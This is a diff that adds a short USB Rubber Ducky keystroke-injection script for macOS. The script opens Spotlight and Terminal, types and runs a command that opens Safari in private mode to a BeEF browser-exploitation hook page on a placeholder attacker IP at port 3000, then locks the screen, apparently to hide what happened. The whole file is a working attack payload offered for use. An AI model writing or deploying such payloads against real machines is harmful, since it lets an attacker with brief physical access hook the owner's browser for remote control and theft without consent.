@@ -1,0 +1,11 @@
+REM You need to update the Ducky Firmware for this to work on macOs - https://github.com/hak5darren/USB-Rubber-Ducky/raw/master/Flash/ducky-flasher1.0.zip
+DELAY 2000
+GUI SPACE
+DELAY 500
+STRING TERMINAL
+STRING open -a Safari -inprivate http://[IP of BeEF instance]:3000/demos/butcher/index.html
+DELAY 250
+ENTER
+DELAY 1000
+GUI-CTRL q
+DELAY 1000
